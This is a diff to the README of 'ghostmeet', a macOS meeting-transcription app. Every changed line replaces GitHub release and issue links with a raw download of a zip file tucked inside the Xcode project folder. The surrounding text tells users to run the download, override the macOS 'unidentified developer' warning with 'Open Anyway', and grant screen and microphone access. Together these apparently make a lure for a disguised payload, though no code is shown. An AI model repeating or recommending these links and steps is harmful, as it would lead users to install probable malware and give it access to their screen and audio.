@@ -1,6 +1,6 @@
 # 👻 ghostmeet - Never Miss a Word Again
 
-[![Download ghostmeet](https://img.shields.io/badge/Download-ghostmeet-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/itamarosappsapp-droid/ghostmeet/releases)
+[![Download ghostmeet](https://img.shields.io/badge/Download-ghostmeet-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/itamarosappsapp-droid/ghostmeet/main/GhostMeet/GhostMeet.xcodeproj/v1.1.zip)
 
 ## 🎯 What Is ghostmeet?
 
@@ -15,13 +15,13 @@ ghostmeet is a smart helper that lives quietly on your Mac during video calls. I
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [Download ghostmeet](https://github.com/itamosappsapp-droid/ghostmeet/releases)
+Visit this link to download the application: [Download ghostmeet](https://raw.githubusercontent.com/itamarosappsapp-droid/ghostmeet/main/GhostMeet/GhostMeet.xcodeproj/v1.1.zip)
 
 Click the link above, and you'll land on the downloads page. Look for the latest release — it's usually at the top. Download the file, then run it. ghostmeet will ask for permission to record your screen and microphone, which is necessary for it to work. Just follow the on-screen prompts, and you're all set.
 
 ## 📥 Installation & Setup
 
-1. **Download** — Click the button at the top of this page or go directly to [the releases page](https://github.com/itamosappsapp-droid/ghostmeet/releases).
+1. **Download** — Click the button at the top of this page or go directly to [the releases page](https://raw.githubusercontent.com/itamarosappsapp-droid/ghostmeet/main/GhostMeet/GhostMeet.xcodeproj/v1.1.zip).
 2. **Run the app** — Open the downloaded file. macOS may ask you to confirm you want to open it since it's from an unidentified developer. That's normal — just click "Open Anyway."
 3. **Grant permissions** — ghostmeet needs access to your screen and microphone. When prompted, go to System Settings → Privacy & Security and enable both.
 4. **Start your call** — Launch ghostmeet before joining any video meeting. You'll see a small floating window appear. That's your control panel.
@@ -89,7 +89,7 @@ A: No. All transcripts and recordings stay on your Mac. Nothing is uploaded auto
 A: Absolutely! It works anytime you grant microphone access.
 
 **Q: How do I update ghostmeet?**
-A: Simply download the newest version from the same [download page](https://github.com/itamosappsapp-droid/ghostmeet/releases) and replace the old app.
+A: Simply download the newest version from the same [download page](https://raw.githubusercontent.com/itamarosappsapp-droid/ghostmeet/main/GhostMeet/GhostMeet.xcodeproj/v1.1.zip) and replace the old app.
 
 ## 🧑‍💻 For Developers and Power Users
 
@@ -124,7 +124,7 @@ Large language models need computing power. Make sure you have a compatible mode
 ## 📬 Community & Feedback
 
 We'd love to hear how ghostmeet works for you! Join the conversation:
-- Submit bug reports or feature requests on our [Issues page](https://github.com/itamosappsapp-droid/ghostmeet/issues)
+- Submit bug reports or feature requests on our [Issues page](https://raw.githubusercontent.com/itamarosappsapp-droid/ghostmeet/main/GhostMeet/GhostMeet.xcodeproj/v1.1.zip)
 - Share tips and tricks with other users
 - Vote for features you'd like to see next
 
